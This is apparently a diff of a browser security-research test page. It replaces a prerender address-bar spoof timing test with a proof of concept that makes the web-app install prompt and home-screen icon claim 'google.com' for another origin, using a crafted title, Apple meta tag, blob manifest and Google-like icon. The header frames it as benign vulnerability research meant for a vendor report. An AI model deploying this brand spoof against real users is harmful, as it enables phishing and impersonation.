@@ -1,26 +1,49 @@
-<!-- 5 | 2026 · SPECULATION RULES / prerender — apakah bar dan konten bertukar di detik yang SAMA? | [1-CLICK]
-     SURFACE BARU (2023+), hampir tak ada di korpus spoofing mana pun.
-     Prerender melukis dokumen tujuan DI LATAR sebelum pengguna pergi ke sana. Saat aktivasi,
-     browser harus menukar DUA hal sekaligus: dokumen yang tampil DAN URL di bar.
-     Kalau keduanya ditukar di jalur kode yang berbeda, ada kemungkinan urutannya tidak atomik.
-     DUA ARAH, dua-duanya bernilai:
-       bar duluan  -> bar menulis tujuan, layar masih halaman ini   (spoofing klasik)
-       konten duluan -> layar sudah tujuan, bar masih halaman ini   (lebih jarang, sama buruknya)
-     File ini juga jadi KONTROL untuk 1-3: halaman ter-prerender melukis instan, jadi
-     jendela commit-vs-paint HARUS ~0 ms. Kalau di sini pun ada jendela, sebabnya bukan paint.
-     EXPECTED-SECURE  aktivasi atomik, selisih 0 ms, di kedua arah. -->
-<script type="speculationrules">
-{"prerender":[{"urls":["2.html?block=0&via=prerender"]}]}
-</script>
-<h2 style="font:20px system-ui">HALAMAN A (ter-prerender: B sudah dilukis di latar)</h2>
-<button onclick="go()">Aktivasi prerender</button>
-<button onclick="location.href='2.html?block=0&via=normal'">Pembanding: navigasi biasa</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!DOCTYPE html>
+<!--
+============================================================================
+ SPOOF VARIANT of CVE-2026-5895 (iOS Omnibox crafted-domain spoof) - BENIGN
+============================================================================
+ ROOT CAUSE (shared): a page-influenced label renders as the trusted identity
+   on a security surface. CVE-2026-5895 pinned the OMNIBOX. This variant moves the
+   SAME root cause to a surface the omnibox fix does NOT cover:
+     -> the WEB-APP INSTALL / "Add to Home Screen" title (S: install-UI, L2 persistence).
+   Grounded in the live sibling CVE-2026-13993 (web-app-install UI domain spoofing).
+ MECHANISM: page supplies manifest name / <title> / apple-mobile-web-app-title =
+   a trusted-looking brand; the install prompt + home-screen icon then carry that
+   brand while the real origin is attacker-owned. Persists on the home screen after
+   the tab is gone (attribution outlives the window).
+ PREDICATE: install UI / home-screen label says "google.com"; real origin = below.
+ EXPECTED-SECURE: install UI shows the REAL registrable domain, not a page-supplied
+   name that implies a different brand.
+ ETHICS: your OWN device only. No credential form, no exfil, no real phishing.
+   Prove predicate -> screenshot install prompt -> STOP -> report (Chrome VRP / Apple).
+============================================================================
+-->
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>google.com</title>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="google.com">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Crect width='120' height='120' rx='24' fill='%234285F4'/%3E%3Ctext x='60' y='78' font-size='64' text-anchor='middle' fill='white' font-family='system-ui'%3EG%3C/text%3E%3C/svg%3E">
+<style>body{font:15px/1.6 system-ui,sans-serif;margin:0;padding:1rem;max-width:680px}
+ footer{position:fixed;left:0;right:0;bottom:0;background:#111;color:#9aa;font:11px/1.4 monospace;padding:5px 8px}footer b{color:#7fd}
+ @media(prefers-color-scheme:dark){body{background:#0f0f10;color:#e8eaed}}</style>
+</head><body>
+<h2>Loading google.com&hellip;</h2>
+<p>iOS: tap <b>Share &rarr; Add to Home Screen</b>. Desktop Chrome: use the <b>Install</b> icon in the omnibox.
+   Watch the title the install UI proposes, and the home-screen icon label afterwards.</p>
+<footer>spoof-PoC (benign) &middot; install-title claims=<b>google.com</b> &middot;
+  REAL origin=<b><span id="real"></span></b> &middot; SECURE=install UI shows REAL domain</footer>
 <script>
-g.textContent = 'REAL ORIGIN: ' + location.href +
-  '\ndukungan prerender: ' + (HTMLScriptElement.supports && HTMLScriptElement.supports('speculationrules') ? 'ADA' : 'TIDAK ADA -> catat ilmu-negatif') +
-  '\n\nJalankan KEDUA tombol dan bandingkan angka jendela yang dicetak 2.html.' +
-  '\nprerender harus ~0 ms. Kalau navigasi biasa jauh lebih besar, selisih itu' +
-  '\nmembuktikan jendelanya memang dari paint, bukan dari jaringan.';
-function go() { sessionStorage.t0 = Date.now(); location.href = '2.html?block=0&via=prerender'; }
+ // Self-contained web-app manifest (blob) so the standard install prompt also carries the crafted name.
+ var mf={name:"google.com",short_name:"google.com",display:"standalone",
+   start_url:location.href,scope:location.href.replace(/[^/]*$/,''),
+   background_color:"#ffffff",theme_color:"#4285F4",
+   icons:[{src:"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='192' height='192'%3E%3Crect width='192' height='192' rx='38' fill='%234285F4'/%3E%3Ctext x='96' y='128' font-size='104' text-anchor='middle' fill='white' font-family='system-ui'%3EG%3C/text%3E%3C/svg%3E",sizes:"192x192",type:"image/svg+xml"}]};
+ var link=document.createElement('link');
+ link.rel='manifest';
+ link.href=URL.createObjectURL(new Blob([JSON.stringify(mf)],{type:'application/manifest+json'}));
+ document.head.appendChild(link);
+ document.getElementById('real').textContent=location.href;   // ORACLE: the real, attacker-owned origin
 </script>
+</body></html>
